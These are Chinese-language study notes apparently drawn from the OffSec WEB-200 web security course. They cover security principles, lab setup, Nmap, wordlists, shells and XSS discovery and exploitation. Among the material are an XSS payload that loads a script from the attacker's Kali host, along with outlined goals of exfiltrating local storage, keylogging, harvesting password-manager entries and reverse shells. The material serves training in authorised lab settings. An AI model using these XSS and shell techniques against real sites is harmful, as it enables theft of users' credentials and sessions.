## 1.1 WEB-200 学习成功要点

本学习单元涵盖以下学习目标：

- 理解围绕应用程序安全的一些通用概念
- 认识到一名成功的应用程序安全专业人员所具备的独特思维模式
- 理解应用程序安全先决知识的支柱

WEB-200 是一条为刚接触 Web 应用程序安全或需要温故知新的人员设计的学习路径。本课程旨在解释在信息安全（Information Security）、渗透测试（Penetration Testing）或应用程序安全（Application Security）领域开启更长远旅程所需的基础概念。

在应用程序评估期间，我们将扮演智能对手的角色，测试各种应用程序的安全缺陷。在某些情况下，我们可能会利用（exploit）这些缺陷，以确定潜在威胁的完整范围，尽管该过程可能是另一个更大范围渗透测试的一部分。无论哪种情况，我们都将就如何修复我们发现的缺陷提出建议。

因为我们在模拟智能对手的行为，并且在对目标了解有限的角度下进行操作，我们必须像攻击者一样思考，采用成长型思维模式（growth mindset），在逆境中迎难而上，不断分析我们的环境，并持续扩充我们的知识库。在本节中，我们将讨论这些要点中的每一个。

作为一名应用程序安全专业人员，在模拟对各种应用程序的攻击时，我们将扮演恶意且智能的对手角色。

这就引出了一个问题：应用程序安全专业人员究竟是从事攻击性（offensive）[1]还是防御性工作。简而言之，答案是两者兼而有之。

举例来说，我们可以设想一个中世纪君主建造城堡的类比。如果君主得知敌方拥有能够投掷巨石的投石车，君主可能会建造更厚的城墙。同样，如果敌方配备了梯子，君主可能会为部队提供将梯子推下城墙的工具。在这个场景中，君主可以通过了解潜在攻击者的技术和思维模式来建立更好的防御。

同样地，在评估的每个步骤中，我们必须考虑攻击者的视角、工具和策略（tactics），并学着预测他们下一步可能会做什么。用行业术语来说，我们应该培养更好的安全思维（security mindset）。[2] 随着我们更好地了解目标系统和网络中的弱点，我们就能更好地模拟各种攻击链（attack chains），从而为客户提供更好的安全建议。

除了安全思维外，我们还必须考虑形成鲜明对比的固定型思维模式（fixed mindset）和成长型思维模式（growth mindset），并认识到它们将如何影响我们作为安全专业人员的工作效率。

拥有固定型思维模式的人认为，他们的技能、天赋或学习能力是“固定不变的”。拥有这种思维模式的人不了解成长带来的各种好处。另一方面，拥有成长型思维模式的人认为心智能力是灵活且适应性强的，并且一个人的学习能力可以随着时间的推移而增长。

陷入固定型思维模式的攻击者将使用一组可预测的工具和技术，且往往以可预测的方式使用。相比之下，拥有成长型思维模式的攻击者将适应其环境，在方法上展现出灵活性，并从错误中吸取教训。

拥有固定型思维模式的防御者通常只能检测到最可预测的攻击。然而，拥有成长型思维模式的防御者能够适应以前未见过的攻击方法，并提升其技能以对抗更高级的攻击者。

既然技术娴熟的对手采用成长型思维模式，我们也必须效仿。有很多实用的方法可以做到这一点，但在接下来的小节中，我们将探讨其中几种。

Offensive Security 团队坚信 Try Harder（更加努力）的思维模式。当我们考虑到在失败的时刻有两种潜在的应对方式时，这一点能得到最好的总结。我们要么将失败视为无法避免的死胡同并接受它，要么将其视为成长的机会，尝试从不同的角度思考问题，相应地调整我们的方法和策略，并在此过程中磨练我们的技能。显然，后者就是 Try Harder 的思维模式，并且与成长型思维模式相契合。

这种思维模式是信息安全行业取得成功的关键，正因如此，在应对我们课程中较难的练习时，它通常是一项必备条件。

践行 Try Harder 的一个具体方法就是放慢脚步，退后一步，深呼吸，然后从另一个角度评估问题。例如，我们的一些练习包含提示。请尽可能多花点时间忍住不去看这些提示。在简单地认为自己已经走投无路之前，更深入地挖掘问题。

在实际的现场评估（live assessment）中，没有“免费提示”可用。当您在本课程中 Try Harder 时，您将启动一种充满挑战的成长型思维模式。然而，坚持不懈直到找到解决方案会产生深深的满足感，并经常伴随著名的肾上腺素“飙升”（buzz），这正是让这个领域如此值得投入的原因。

然而，当您正在学习基础知识时，如果您已经付出了最大努力，请毫不犹豫地联系我们。这绝对没有什么可丢脸的。毕竟，您正在接受培训，而我们就在这里提供帮助。不要让过度的挫败感在您辉煌的职业生涯起步之前就让您灰心丧气！

在下一节中，我们将在讨论各种研究技术时，探讨 Try Harder 思维模式的一些实践方面。

我们不可能在这里提出一个包罗万象的故障排除（troubleshooting）流程，但我们可以推荐以下简单的两步法：收集数据（collect data）并进行研究（do research）。

收集数据仅仅意味着我们必须退后一步，评估现状。这通常意味着我们必须退后以获得更高层次的视角，彻底思考问题，并全面审查任何数据、信息以及（特别是）来自我们的工具的输出或错误。如果一个工具生成了输出或错误信息，请仔细并彻底地阅读它。很多时候，在评估最紧张的阶段，即使是经验丰富的安全专业人员也会匆匆略读数据并产生误读，导致他们浪费数小时去排查错误的问题。在评估现状时，我们必须关注实际事实，并利用我们掌握的信息来展示对组织的潜在影响。

此外，我们需要花时间检查我们的语法（syntax）并阅读工具手册。一个简单的语法错误或工具的不正确使用可能会导致各种意想不到的结果。

## 1.2 安全基础概念入门

本学习单元 (Learning Unit) 涵盖以下学习目标 (Learning Objectives)：

- 理解 CIA 三元组 (CIA triad) 及其含义
- 理解该领域的其他关键术语 (key terms) 和独特特征

在接下来的小节中，我们将讨论各种对安全专业人员 (security professionals) 至关重要的基础安全原则 (security principles)。

全面描述安全基础设施 (security infrastructure) 元素的一种方法是通过 CIA 三元组 (CIA triad) 的视角。它描述了三个原则：机密性 (Confidentiality)、完整性 (Integrity) 和可用性 (Availability)。

在保护任何资产 (asset) 时，都必须考虑这些原则中的每一个，因为大多数（尽管不是全部）针对计算机系统和网络的攻击都会威胁到这些元素之一。让我们更详细地讨论每一个原则。

如果一个系统只能由被明确允许访问的个人访问，那么该系统就是机密的 (Confidential)。例如，只要密码只有所有者知道，密码就被认为是机密的。如果黑客 (hacker) 窃取或猜出了密码并且能够访问该账户，这将构成对机密性的攻击。针对机密性的常见攻击包括通过 SQL 注入 (SQL Injection)[3] 进行的数据库外发泄露 (database exfiltration) 以及不安全的直接对象引用 (Insecure Direct Object Referencing, IDOR)[4]。

如果一个系统只存储所有者打算让它存储的信息，那么该系统就具有完整性 (Integrity)。在上述例子中，仅仅通过猜测密码登录到用户的账户并不属于对完整性的攻击。然而，如果攻击者 (attacker) 上传或删除数据，这就构成了对系统完整性的潜在攻击。针对完整性的一种常见攻击是任意代码执行 (arbitrary code execution)[5]。

如果应该访问系统的用户能够进行访问，那么该系统就被认为是可用的 (Available)。再次考虑上述场景。攻击者已经获得了对用户账户的访问权限，并上传了他们选择的数据。如果攻击者接着更改了用户的密码并阻止他们登录，那么这现在也将构成对账户可用性的攻击。针对可用性的一种常见攻击是拒绝服务 (denial of service)[6]。

在接下来的部分中，我们将讨论在参与本课程时需要考虑的其他重要安全原则。

关于安全原则的探讨足以构成一门完整的学科[7][8]，其内容远超本入门学习模块 (Learning Module) 所能涵盖的范围。然而，在继续前进之前，我们还应该讨论几个高层级的原则。

最小特权原则 (Principle of Least Privilege)[9] 规定，系统的每个部分（特别是用户账户和程序代码）只应被授予所需的最低特权。这有助于确保该组件不会轻易被滥用以向攻击者授予提升的特权 (escalated privileges)。有效地应用这一原则可以显著减少组件的攻击面 (attack surface)。

开放式安全 (Open Security)[10] 是一个看似违反直觉的原则，它指出系统的安全性不应依赖于保密性 (secrecy)。换句话说，即使攻击者完全了解系统的安全实现方式，攻击者仍应被挫败。系统中有一些元素应该是保密的，例如用户凭证 (user credentials)。但是，如果构成系统的功能和算法是开放的，并且已经过安全社区 (security community) 的审查，那么它通常对攻击具有更强的弹性。

纵深防御 (Defense in Depth)[11] 提倡在系统的尽可能多的层面上添加防御，以便如果一层被绕过 (bypassed)，另一层仍可能防止完全渗透 (full infiltration)。在信息安全背景之外的纵深防御示例可以是：使用电子密码打开车库，然后是可以用钥匙打开的插销门锁，接着是声控内部警报系统。

本课程及其各个学习模块 (Learning Modules) 的结构相对简单明了。在宏观层面上，我们引入了几个学习模块，每个学习模块包含多个学习单元 (Learning Units)。每个学习单元都以解释开始，其中我们强调了一些最重要的概念和想法，并介绍了学习模块背后的理论。

一些学习单元包含练习 (exercises)。在练习中，我们可能会要求您回答一个简单的问题。在更高级的练习中，我们将要求在一台机器上完成一项操作，并要求提供一个信息标志 (flag)。标志通常格式化为“OS{InsertFlagValueHere}”。

例如，练习可能会写道：“登录到位于 192.168.50.1 的机器，并从用户 Samantha 的桌面上检索标志 (flag)”。完成这些步骤后，我们应该会找到一个标志文件 (flag file)，也许叫做 flag.txt，其中将包含基于文本的标志，然后我们可以将其复制并粘贴到答案字段中提交。

这种类型的练习需要主动学习 (active learning)，这是非常有效的。它要求直接应用技能和进行实践，并且是 OffSec 学习方法 (learning methodology) 的关键。

随着我们在课程中的推进，练习是按顺序呈现的。这意味着它们应该按顺序完成，因为练习通常建立在彼此的基础之上。

最后请注意，课程材料中呈现的 IP 地址 (IP addresses) 并不一定反映 Offensive Security 实验室中的 IP 地址。不要尝试一字不差地复制示例。始终根据您特定的实验室配置 (lab configuration) 调整示例。在启动机器后，每台部署机器的特定 IP 地址将直接显示在 Web 门户用户界面 (web portal UI) 中。

在接下来的部分中，随着我们将重点转向实验室环境，我们将讨论这一点。

练习是在我们实验室环境中运行的目标机器 (target machines) 上完成的。正如我们将在这部分详细讨论的那样，实验室环境由几个组件构成：

- 一台 Kali Linux 虚拟机 (virtual machine, VM)
- 在线门户 (Online Portal)
- 一组在实验室中运行的目标机器 (target machines)
- 从 Kali 虚拟机到实验室环境的 VPN 连接

让我们花点时间在宏观层面上讨论一下这些组件。

首先，本课程需要安装 Kali Linux。Kali Linux[12] 是一个操作系统 (operating system)（就像 Windows 或 macOS），它附带了一组专门用于信息安全活动的特定工具。由于它是开源的 (open source)，因此 Kali Linux 可以免费使用。

我们强烈建议在虚拟机 (VM)[13] 中安装 Kali，这允许我们在一个操作系统中运行另一个操作系统。虽然我们可以将 Kali 安装到专用机器上，但将 Kali 与我们的主操作系统“并排”安装会更方便、更高效，以便我们可以轻松访问两个操作系统可用的所有工具。这可以通过虚拟机软件 (virtual machine software) 来实现。

例如，我们可能坐在办公桌前，使用的是运行 Windows 的台式机或运行 macOS 的笔记本电脑。我们可以在 Windows 机器上安装 VMware Workstation Player，或者在 Mac 上安装 VMware Fusion，以允许我们安装 Kali Linux VMware 镜像 (image)。当安装了这个虚拟镜像后，Kali 将在一个窗口中与我们的主操作系统一起运行，如果需要也可以全屏运行。在这台机器中运行的 Kali Linux 将可以访问网络并拥有自己的 IP 地址，其行为就像安装在专用机器上一样。

从术语的角度来看，运行 Windows 或 macOS 的系统是我们的“宿主机 (host machine)”，而 Kali 是“本地 (local)”或“客户机 (guest) VM”。

我们为 WEB-200 提供的 VMware 镜像是 Kali Linux 的默认 64 位构建版本。我们建议使用 Offensive Security 虚拟机镜像下载页面[14]上提供的最新 VMware 镜像。请注意，虽然 VirtualBox 镜像、Hyper-V 镜像或 Kali 的专用安装应该具有相同的工作方式，但我们只能为提供的 VMware 镜像提供支持。

一旦我们使用 Kali Linux 设置了虚拟机，我们将使用提供的凭证从 Kali 连接到在线门户 (Online Portal)。如果我们点击学习管理系统 (Learning Management System) 登陆页面右上角的 下载 VPN (Download VPN) 按钮，我们将获得连接所需的配置。此外，应使用 OpenVPN 来连接此配置。登录后，我们将可以访问学习材料。接下来，我们将从我们的 Kali 机器连接到 VPN，从而允许我们访问实验室，只要我们正在使用它，该实验室就是专门分配给我们的。这创造了一个独特的环境，每个学生都可以按照自己的节奏学习，而无需担心打断其他学生或被其他学生打断。

即使每个实验室都是私有的，将实验室视为敌对环境 (hostile environment) 也很重要，我们不应该将敏感信息存储在用于连接实验室的 Kali Linux 虚拟机上。严格禁止学生对学生 (Student-to-student) 的 VPN 流量，这可能导致被终止对课程及其材料的访问权限。无论如何，我们应该始终保持安全思维 (security mindset)。至少，我们应该停止不必要的服务并更改我们 Kali Linux 系统上的默认密码和密钥。

在本节中，我们将讨论一些理论知识，以更好地理解什么是代理 (Proxy)、代理的使用方式，以及我们如何利用它们来漏洞利用 (exploit) 各种服务。我们应该记住，我们主要使用代理进行的工作将集中在 Web 层面。

维基百科 (Wikipedia)[18] 对代理的描述如下：

客户端不是直接连接到能够满足请求资源（如文件或网页）的服务器，而是将请求定向到代理服务器 (proxy server)，由代理服务器评估该请求并执行所需的网络事务 (network transactions)。[18-1]

本质上，代理 (proxy) 是一个服务器应用程序 (server application)，它充当客户端到服务器请求之间的中间人 (man-in-the-middle) 或中介 (intermediary)。[18-2]

## 2.3 Nmap 端口扫描工具

本学习单元涵盖以下学习目标：

- 理解如何执行 Nmap NSE 脚本
- 学习如何扫描特定端口

Nmap[23] 是一款免费且开源的网络扫描工具。它可用于发现特定目标机器或整个网段上的主机、服务和端口。虽然该工具以其网络扫描功能而闻名，但我们也可以将某些 Nmap 选项或标志 (flags) 与各种脚本结合使用，以便在 Web 应用程序评估期间检索有用的信息。

让我们通过一些 Nmap 实践来更好地了解它是如何工作的。

首先，我们假设我们的目标机器是 `offsecwp`，位于 172.16.80.1。

我们的第一步是使用 `export` 命令将我们的目标 IP 环境变量 (environment variable) 导出到终端中。由于我们之前编辑了 `/etc/hosts` 文件，将 IP 172.16.80.1 映射到 `offsecwp`，我们也可以指定“offsecwp”作为我们的目标。然而，通常情况下，我们将扫描直接的数字 IP 地址，因此让我们导出在线门户 (Online Portal) 中提供给我们的实际虚拟机实验室 IP。

Bash

```
kali@kali:~$ export IP="172.16.80.1"
            
kali@kali:~$ echo $IP             
172.16.80.1
```

养成导出环境变量（例如 URL 或端点）的好习惯。如果预先设置了这些环境变量，我们可以更快速地启动所需的工具。

对于我们的第一次 Nmap 扫描，让我们扫描 80 端口并检查输出。我们将向 Nmap 提供带有值 80 的 `-p` 参数，以指示我们只对扫描 80 端口感兴趣。接下来，我们有 `$IP` 参数，它是我们导出的 IP 环境变量。

需要注意的是，服务和 OS 信息是可以被欺骗的 (spoofed)，应该使用其他方式进行验证。

在本节中，我们将扩展对 Nmap 的理解，以了解更多关于 Nmap 脚本引擎 (Nmap Scripting Engine, NSE)[24] 的信息。正如我们将要发现的，Nmap 脚本在渗透测试期间非常有用。

Kali Linux 提供了大量被称为 NSE 脚本的脚本。它们是用 Lua 语言编写的小文件，我们可以使用它们在处理某个端口时执行各种功能。有些脚本被认为是“安全的 (safe)”，而另一些可能具有侵入性 (intrusive)。一个安全的脚本从执行到完成都不会进行任何破坏性行为。而侵入性脚本通常意味着更高的流量状况、向目标服务器写入文件，或有账户被锁定的风险（例如在进行暴力破解时）。我们将检查一些与 HTTP 协议相关的 NSE 脚本，它们都相对安全。

## 2.4 字典文件

本学习单元涵盖以下学习目标：

- 深入理解字典 (wordlist) 的概念
- 了解如何尝试为我们的场景选择最佳的字典
- 学习构建我们自己的字典所需的基础知识

作为一名入侵者 (intruder)，字典 (wordlist) 是我们最有价值的工具之一。我们将使用字典来自动发现漏洞、对各种协议的登录进行暴力破解 (brute forcing)、恢复（破解）从数据库和配置文件中提取的密码哈希 (password hashes) 等等。毫不夸张地说，为特定任务选择正确的字典将使过程变得更加容易和高效。

在执行有针对性的枚举 (enumeration) 或模糊测试 (fuzzing) 时，使用适合该工作的字典至关重要。我们可以为此使用 SecLists[26] 软件包。正如其项目页面所述，SecLists 是“安全测试人员的伴侣”。它是一个庞大的密码、用户名和 payload（有效载荷）存储库，这些内容在过去都取得过成功的结果。自然，如果我们不熟悉 SecLists，那将是我们的损失。

我们要检查的下一个工具是 Wfuzz，它可以为测试 Web 层面的输入点提供极佳的覆盖率。

首先，让我们来了解模糊测试 (fuzzing) 这个术语。模糊测试是一种技术，它涉及以输入的形式向应用程序或服务发送大量有效 (valid) 和无效 (invalid) 数据。模糊测试器 (fuzzer) 是一种执行这种输入测试的自动化软件形式。

## 2.7 Hakrawler 网页爬虫工具

爬虫 (crawler)（有时被称为蜘蛛工具，spidering tool）会检索网页的数据并提取端点 (endpoints)，例如 JavaScript 文件、链接等等。我们通常可以为这类工具提供一个深度 (depth) 值，以指示它们在我们的 URL 或端点上应该爬取多深。

Hakrawler 碰巧有一个非常独特的功能，使其有别于大多数其他的爬行或蜘蛛工具。让我们进一步了解这个特殊的工具。

## 2.8 交互式 Shell

本学习单元涵盖以下学习目标：

- 涵盖 shell 的概念以及为什么我们需要它
- 学习如何确定 Web 应用程序的特定 Web 技术
- 了解如何选择正确的 shell（与 Web 技术相匹配）

无论攻击面是什么，任何网络攻击的核心目标之一都是通过 shell[29] 实现代码执行。因为我们希望在实现代码执行后与计算机系统进行最高程度的交互，所以最好的选择是使用 shell。通过 shell，我们将能够直接从命令行界面 (Command Line Interface, CLI)[30] 或终端输入我们自己的命令，底层操作系统将知道如何解释这些命令。然而，在检索到我们自己的 shell 之前，我们需要先进行初始代码执行的实验。

为此，我们将以 `http://execsandbox:80/` 为目标进行示例，这是此在线门户中提供的一个特别设计的实验室机器。在这个沙箱中，我们将利用 PHP 执行系统命令。为此，我们将使用 PHP 的原生 `passthru()` 函数。该函数允许执行代码，并且其设计方式使得输出在 Web 客户端中是干净的。因此，我们将在我们的实时执行沙箱中将 `id` 命令传递给 `passthru()` 函数，并检查下图中的结果。

![image-20260428153810553](./image/WEB200-2023/image-20260428153810553.png)

如上图所示，我们可以通过 Web 技术（在本例中为 PHP）执行代码。这台特定的机器服务于一个单一的目的：通过 Web 执行代码。

如前所述，我们可以原生执行 PHP 命令，或者通过其许多系统执行函数分别执行系统操作。

在下一节中，我们将更详细地讨论什么是 Web 技术或 Web 堆栈 (web stack)。此外，我们将讨论它们在攻击 Web 层面时如何发挥重要作用。

在学习 shell，特别是那些通过 Web 层面获取的 shell 时，我们需要首先了解我们正在使用哪种 Web 技术，以便获取 shell。Web 技术代表我们管理 shell 的执行。

当我们在 Web 应用程序中执行某项操作时，我们通常会将输入发送到后端 (back end)。后端有时也被称为 Web 堆栈或解决方案堆栈 (solutions stack)[31]。Web 应用程序也通常由多种 Web 技术的组合构成。

我们有许多方法来确定 Web 服务的技术，而选择哪种方法需要随着时间和经验的积累。我们的方法包括检查扫描输出、安装/Readme/许可证文件、源代码、版权日期、文件扩展名等。这些是我们可以检查的常见位置，以发现 Web 服务器正在使用哪些类型的 Web 技术。在某些情况下，我们还可以检索版本号。

从红队 (red-team) 的角度来看，识别目标机器的 Web 技术和操作系统被认为是一项非常有用的能力。例如，如果存在 Bash，我们也许能利用它来实现反弹 shell (reverse shell)。

安全专业人员已经开发了各种各样的方法，利用 Web 技术和二进制文件来实现代码执行，并最终获得 shell。因为我们执行的每个命令都是目标机器上的一个二进制文件或可执行文件，我们将需要仔细考虑每个可能的二进制文件，看作是我们可能能够通过 Web 权限利用的东西，从而获得对机器的控制权。我们的意思是，如果我们正在执行系统命令，了解我们可以执行哪些二进制文件或命令以获得对机器的更大控制权，总是一个好主意。

在下一节中，我们将回顾如何使用这些功能，并确保我们的 payload 经过正确编码，以排除坏字符 (bad characters)。

在计算机安全中，Payload 指的是消息中旨在发送给目的地的部分[32]。在计算机病毒和蠕虫中，payload 是执行特定一组操作的恶意软件部分。

我们可以使用的一种此类 shell 被称为反弹 shell (reverse shell)。从 TCP 的角度来看，我们将作为入站流量 (inbound traffic) 接收我们的 shell。也就是说，我们将建立一个监听器 (listener) 或处理程序 (handler)（通常使用 Netcat 或 Meterpreter），它期待来自我们攻击机外部的 shell 的 TCP 连接。

在大多数情况下，要执行反弹 shell payload，我们只需要更改我们的 IP 地址和我们将要监听的端口。

## 3、跨站脚本 XSS 基础与漏洞发现

在本学习模块中，我们将涵盖以下学习单元：

- 攻击性用途的 JavaScript 基础 
- 跨站脚本攻击 - 发现

跨站脚本攻击 (Cross-Site Scripting, XSS) 是一种利用用户对他们所访问网站信任的漏洞。这种信任被动态注入到用户浏览器渲染的页面中的内容所利用。XSS 将访问 Web 服务器的受害者作为目标。与许多其他 Web 应用程序漏洞不同，为了使攻击发挥作用，来访的受害者必须拥有比我们作为攻击者更广泛的权限。然而，由于需要目标用户，许多关于 XSS 的分析和解释在达到基本的概念验证 (proof-of-concept, PoC) 后就停止了。通常，这种概念验证可能会为访问该页面的任何用户打开一个警告框 (alert box)。

除了停留在概念验证阶段外，“跨站脚本攻击”这个名称也在业界引起了许多混乱。正如我们将要发现的，该漏洞利用不一定是“跨站 (cross-site)”的，也不一定涉及“脚本 (scripting)”。此类攻击更贴切的名称应该是 JavaScript 注入或 HTML 注入（当不使用 JavaScript 时）。

在本学习模块中，我们将配置我们的 Kali 机器以用于 XSS 环境学习模块。我们还将学习如何使用 XSS 沙盒 (Sandbox)，这将帮助我们了解在没有目标受害者时如何漏洞利用 XSS。

在随后的学习模块中，我们会发现除了弹出警告框之外，漏洞利用还有更多内容。我们会发现，在许多情况下，XSS 为我们提供了对目标用户浏览器可以执行、查看和访问的内容的完全访问权限。首先，我们将从讨论不同类型的 XSS 以及如何漏洞利用它们开始。接下来，我们将演示如何窃取敏感数据或对用户进行网络钓鱼 (phish)。最后，我们将通过一个案例研究来回顾真实世界中 XSS 漏洞的漏洞利用。

尽管现代浏览器已经实现了各种形式的针对 XSS 漏洞的保护，但很多时候这些保护措施是不够的（如 cookie 上的 HttpOnly 标志[40]）或者由于会导致太多问题而无法实施（如内容安全策略[41]）。

## 3.2 面向渗透攻击的 JavaScript 基础

JavaScript 是一种高级编程语言，已成为现代 Web 应用程序的基础组件之一。所有现代浏览器都包含一个 JavaScript 引擎，用于运行任何客户端 (client-side) JavaScript 代码。本学习单元介绍了 JavaScript 的一些对安全专业人员有用的功能和语法。

当浏览器处理包含 HTML 的 HTTP 响应时，浏览器会创建一个文档对象模型 (Document Object Model, DOM) 树并渲染它。DOM 包含页面上的所有表单 (forms)、输入 (inputs)、图像等。JavaScript 可以访问和修改页面的 DOM，从而为最终用户带来更具交互性的体验。从漏洞利用的角度来看，这也意味着如果我们可以注入 JavaScript，我们就可以访问和修改页面的 DOM。有了对 DOM 的访问权限，我们可以重定向登录表单、提取密码、对用户进行网络钓鱼等等。

## 3.3 跨站脚本 — 漏洞发现

本学习单元涵盖以下学习目标：

- 了解不同类型的 XSS
- 漏洞利用反射型服务端 XSS (reflected server XSS)
- 漏洞利用存储型服务端 XSS (stored server XSS)
- 漏洞利用反射型客户端 XSS (reflected client XSS)
- 漏洞利用存储型客户端 XSS (stored client XSS)

虽然“跨站脚本 (Cross-Site Scripting)”是正式名称，但将其视为 JavaScript 注入更容易理解。作为攻击者，我们注入的代码将在受害者的浏览器中执行。需要注意的是，XSS 漏洞不能直接导致服务器的远程代码执行 (remote code execution)。相反，XSS 攻击的目标是应用程序的用户。这些漏洞利用了用户对其正在访问的应用程序的信任。

与许多其他漏洞不同，跨站脚本漏洞的被漏洞利用并不是因为应用程序接受了不受信任的用户输入。相反，应用程序之所以脆弱，是因为它**输出**了不受信任的输入。虽然用于漏洞利用的 payload 必须来自不受信任的源，但在该 payload 被发回给用户之前，它并不构成 XSS 漏洞利用。

即使应用程序没有完成任何输入净化 (input sanitization)，只要在输出时对 payload 进行了适当的净化，就不会留下导致 XSS 的途径。相反，如果应用程序进行了完美的 XSS 输入净化，但在输出时没有进行任何编码 (encoding)，如果攻击者可以通过其他方式（诚然，这非常罕见）注入内容，应用程序可能仍然容易受到 XSS 攻击。

跨站脚本可分为两种主要类型：**反射型 (reflected)** 和 **存储型 (stored)**。两者的主要区别在于，存储型是持久的 (persistent)，而反射型则不是。反射型 XSS payload 仅通过精心设计的链接或来自其他站点的定向重定向来触发漏洞利用。相反，顾名思义，存储型 XSS 会将 payload 保存在数据库中。这意味着多个受害者可能会在浏览该网站的过程中成为存储型 XSS 攻击的牺牲品，这使得存储型 XSS 危险得多。存储型和反射型的分类是指 payload 的持久化程度。

此外，存储型和反射型 XSS 还可以进一步细分为**服务端 XSS (server XSS)** 或 **客户端 XSS (client XSS)**。这是指 payload 在应用程序架构中被输出的位置。对于服务端 XSS，应用程序服务器会将不受信任的用户输入追加到 HTML 文档中，而不进行任何输出编码。对于客户端 XSS，非恶意的客户端 JavaScript 会将不受信任的用户输入追加到 DOM 中，而不进行任何进一步的编码。这一点很重要，因为客户端 XSS 更难被发现。虽然可以通过发送请求并检查响应来发现服务端 XSS，但必须通过使用浏览器或审计前端 JavaScript 代码才能发现客户端 XSS。

> 历史上，XSS 被分为三类：存储型、反射型和基于 DOM 的 (DOM-based)。术语“基于 DOM 的”即是我们现在所说的“客户端 XSS”。这三个类别描绘了一幅不准确的 XSS 全景图。使用这三个类别，学生自然会假设 XSS 漏洞要么是存储型的，要么是反射型的，要么是基于 DOM 的。事实并非如此。漏洞可能是存储型服务端 XSS、存储型客户端 XSS、反射型服务端 XSS 或反射型客户端 XSS。XSS 的术语多年来一直被忽视，这在业界造成了很大的混乱。

无论 XSS 漏洞利用的位置或可能性如何，所有 XSS 漏洞都需要某种形式的**用户交互 (user interaction)**。此外，受害者必须具有与我们作为攻击者不同的访问权限。我们无法针对具有等同于公共用户访问权限的用户进行漏洞利用。目标用户可以是：使用标准会话 cookie 进行身份验证的用户、因其访问的 IP 地址而通过身份验证的用户，或者使用应用程序将其敏感数据保存在其本地存储中的用户。

在本学习单元中，我们将回顾反射型服务端 XSS、存储型服务端 XSS、反射型客户端 XSS 和存储型客户端 XSS。使用 XSS Sandbox 应用程序，我们将演示各种漏洞利用，重点关注发现 XSS 漏洞并从各种入口点逃逸 (escaping out)。在这里，我们不会重点讨论绕过身份验证、击键记录或任何其他具体的漏洞利用方法。

反射型服务端 XSS 通常存在于通过 GET 参数发送用户输入的位置。要对其进行漏洞利用，我们通常会向用户发送一个包含 payload 的链接。由于用户信任该域名，他们会点击链接，服务器会追加我们的 payload，然后用户的浏览器将执行该 payload。与电子邮件网络钓鱼活动不同，我们不必担心如何让域名“看”起来很逼真，因为用户应该已经信任被发送的域名了。

> POST 参数也有可能导致反射型 XSS。然而，我们无法通过链接向用户进行网络钓鱼。相反，我们必须将用户钓鱼到一个我们控制的站点，并在用户访问时让表单自动提交 (auto-post)。不过，所有这些条件同时满足的可能性比站点存在 GET 参数漏洞的可能性要小得多。出于这个原因，我们将重点关注通过 GET 参数产生的反射型 XSS 漏洞。

### 客户端xss

虽然客户端 XSS 的危害与服务端 XSS 几乎一样，但在漏洞挖掘和 Payload 构造上却大不相同。 因为恶意代码是由浏览器（前端 JavaScript）动态拼接进页面的，而不是由服务器直接生成的。这就意味着，我们不能像找服务端 XSS 那样，光靠抓包看 HTTP 请求和响应源码就下结论。我们必须在真实的浏览器环境中把页面完整渲染出来，才能观察到 Payload 是否被成功触发。

## 4.1 跨站脚本 — 漏洞利用

本学习单元涵盖以下学习目标：

- 从外部资源加载 XSS payload
- 外带浏览器本地存储 (local storage) 中加载的机密信息
- 记录受害者的击键 (keystrokes)
- 从密码管理器中外带保存的密码
- 以一种逼真的方式对用户进行网络钓鱼 (phish)

完成本学习单元大约需要 6 小时。

历史上，攻击者曾利用跨站脚本漏洞窃取经过身份验证的用户的会话 cookie (session cookies)。然而，随着缓解措施的增加（最显著的是会话 cookie 上的 `HttpOnly` 属性），这类攻击受到了限制。由于这种限制只阻止了一种漏洞利用载体 (vector)，我们还有许多其他载体可以选择进行漏洞利用。

例如，由于浏览器会自动对来自用户的请求进行身份验证，我们可以利用这一特性来**劫持用户的会话（或：利用用户已登录的会话）**并代表他们执行操作，例如更改他们的密码或下载敏感信息。然而，这通常需要白盒 (whitebox) 方法、现有的用户帐户或对应用程序的深入了解。因此，我们不会将重点放在特定的基于应用程序的漏洞利用上，相反，我们将使用 XSS 来窃取会话令牌 (session tokens)（并演示带有 HttpOnly 属性的会话令牌是如何无法被访问的）以及从本地存储中提取数据。

我们还可以通过记录击键、从密码管理器中提取保存的密码或对用户进行网络钓鱼来攻击用户。这些类型的攻击独立于应用程序，并且几乎适用于所有应用程序，只要有值得利用的东西即可。

现在，我们可以启动下面列出的 XSS Sandbox 机器，并在开始工作之前在我们的 Kali 机器上进行相应的 IP 地址更新。我们将在本学习单元中使用此虚拟机。

接下来我们要讲的攻击手法，远比单纯弹个警告框要复杂得多，因此我们需要构建能执行复杂逻辑的 Payload。 虽然你确实可以把一长串恶意代码硬挤成一行直接注入进去，但实战中更好的做法是：**注入一个简短的 `<script>` 标签，让受害者的浏览器主动去我们的 Kali 服务器上远程加载完整的 JS 脚本。** 采用这种外部加载的方式，我们就可以随心所欲地编写极其复杂的 JavaScript 代码，彻底免去了为了绕过过滤而进行各种繁琐的字符转义或编码（Encoding）的烦恼。

让我们通过漏洞利用 XSS 沙盒中的 Search应用程序来演示这一点。目前，我们仍将坚持使用 alert 漏洞利用，但这将在接下来的部分中更新。

我们将不使用内联 (inline) JavaScript，而是添加一个 `script` 标签，并将其 `src` 属性设置为托管在我们 Kali 机器上的文件。这将使 payload 变为 `<script src="http://<KALI_IP>/xss.js"></script>`。我们还需要在我们的 Kali 机器上创建一个名为 `xss.js` 的文件并托管它。

我们将使用 Python 内置的 HTTP 服务器来托管该文件。我们将在名为 `xss` 的目录（可在我们的主目录中找到）中提供所有内容。`xss.js` 文件将仅包含一条 "alert" 指令。最后，我们将使用 `python3 -m http.server 80` 启动 HTTP 服务器。

```bash
kali@kali:~$ mkdir xss

kali@kali:~$ cd xss

kali@kali:~/xss$ echo "alert(1)" > xss.js

kali@kali:~/xss$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

Web应用程序能够将数据存储在用户的浏览器中，这项功能通常用于存储大量数据。例如，一个允许用户编辑文档的应用程序可能会在将文档发送到服务器保存之前，先将其作为缓存存储在浏览器本地。这样即使用户关闭标签页，数据也不会丢失。然而，本地存储也可能包含API密钥或用户个人信息等敏感信息。

我们可以使用两种类型的存储：
1. *sessionStorage* [[53\]](#fn-53-75cda2e6654bb95e)
2. *localStorage* [[47-1\]](#fn-47-75cda2e6654bb95e)。

两者唯一的区别在于持久性级别。localStorage 会一直保留数据，直到被显式删除，而 sessionStorage 则会一直保留数据，直到标签页关闭。可以使用*window.localStorage*属性访问 localStorage 数据，而可以 使用*window.sessionStorage*访问 sessionStorage数据。

